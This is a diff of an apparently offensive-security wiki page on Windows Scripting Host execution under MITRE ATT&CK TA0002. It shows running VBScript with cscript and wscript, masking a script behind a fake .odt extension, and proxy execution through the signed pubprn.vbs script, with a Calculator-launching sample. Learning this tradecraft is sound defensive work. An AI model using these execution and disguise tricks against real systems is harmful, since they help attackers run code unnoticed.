@@ -1,6 +1,3 @@
----
-description: MITRE ATT&CK™ Technique TA0002
----
 # Windows Scripting Host (WSH)
 
 ## Theory
@@ -27,9 +24,6 @@ cscript.exe c:\Users\Veresk\Desktop\openCalc.vbs
 wscript.exe c:\Users\Veresk\Desktop\openCalc.vbs
 ```
 
-{% hint style="success" %}
-A nice trick !
-{% endhint %}
 A trick is to change the .vbs extension by a randomly choosen one.
 ```bash
 wscript.exe /e:VBScript c:\Users\Veresk\Desktop\openCalc.odt
@@ -74,3 +68,4 @@ cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1
 ## Resources
 
 {% embed url="https://tryhackme.com/room/weaponization" %}
+{% embed url="https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce" %}
